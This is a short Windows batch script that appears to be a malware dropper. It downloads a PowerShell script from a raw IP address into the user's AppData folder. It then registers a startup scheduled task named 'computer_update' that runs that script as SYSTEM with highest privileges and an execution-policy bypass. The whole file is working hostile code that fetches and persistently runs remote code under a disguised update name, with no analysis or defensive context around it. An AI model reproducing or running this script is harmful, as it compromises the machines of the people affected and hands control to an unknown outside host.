@echo off
powershell -c "Invoke-WebRequest -Uri 'http://103.62.153.74:53000/computer_detail/script.ps1' -OutFile '%USERPROFILE%\AppData\Local\script.ps1'"
schtasks /create /tn "computer_update" /sc onstart /delay 0010:00 /rl highest /ru system /tr "powershell -ExecutionPolicy Bypass -File %USERPROFILE%\AppData\Local\script.ps1"
pause